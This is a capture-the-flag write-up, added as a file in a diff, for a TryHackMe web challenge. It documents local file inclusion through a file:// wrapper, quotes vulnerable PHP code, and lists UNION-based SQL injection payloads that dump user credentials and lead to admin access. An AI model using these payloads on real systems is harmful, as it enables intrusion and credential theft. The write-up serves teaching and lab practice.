@@ -1,0 +1,60 @@
+TryHackMe - Recruit CTF Challenge Summary
+==========================================
+
+Category: Web
+Status: COMPLETED (both flags captured)
+
+ATTACK CHAIN
+------------
+
+1. RECONNAISSANCE
+   - Target: Recruitment portal web application
+   - Discovered endpoint: /file.php?cv=<URL>
+   - Description: "API that fetches candidate CVs from external sources"
+
+2. LFI VIA file:// WRAPPER
+   - Tried HTTP/HTTPS SSRF payloads -> all blocked: "Only local files are allowed"
+   - Tried localhost bypasses (127.0.0.1, [::1], 0.0.0.0, decimal, octal) -> all blocked
+   - Realized the error message was a hint: file:// protocol was what was ALLOWED
+   - Payload: file.php?cv=file:////var/www/html/config.php
+   - Result: HR staff credentials leaked from PHP source
+
+3. INITIAL FOOTHOLD (HR ACCESS)
+   - Logged in as HR user with credentials from config.php
+   - Retrieved USER FLAG from HR dashboard (/user.txt)
+
+4. SOURCE CODE REVIEW
+   - Used file:// LFI to read dashboard PHP source
+   - Payload: file.php?cv=file:////var/www/html/dashboard.php (or similar)
+   - Discovered unsanitized SQL injection in search parameter:
+     $search = $_GET['search'];
+     $query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
+   - SQL errors displayed on page -> error-based SQLi confirmed
+
+5. SQL INJECTION -> ADMIN CREDENTIALS
+   - Confirmed injection with: ' (single quote -> MySQL syntax error)
+   - Found column count: %' ORDER BY 4-- - (works), ORDER BY 5 (errors) -> 4 columns
+   - All 4 columns visible: %' UNION SELECT 1,2,3,4-- -
+   - Enumerated tables: %' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+     Result: candidates, users
+   - Dumped columns: %' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
+     Result: id, username, password
+   - Extracted credentials: %' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4 FROM users-- -
+
+6. PRIVILEGE ESCALATION (ADMIN ACCESS)
+   - Logged in as admin with extracted credentials
+   - Retrieved ADMIN FLAG from admin dashboard (/admin.txt)
+
+VULNERABILITIES
+---------------
+- LFI via file:// URL wrapper (file.php?cv parameter)
+- Error-based UNION SQL Injection (search parameter, no sanitization)
+- Credentials stored in readable config file
+- SQL errors exposed to the user
+
+KEY LESSONS
+-----------
+- Error messages are clues: "Only local files are allowed" told us what WAS accepted
+- Always read PHP source when you have LFI - it reveals the next vulnerability
+- Unsanitized $_GET in SQL queries = full database compromise
+- Enumerate first: map the attack surface before going deep on one vector
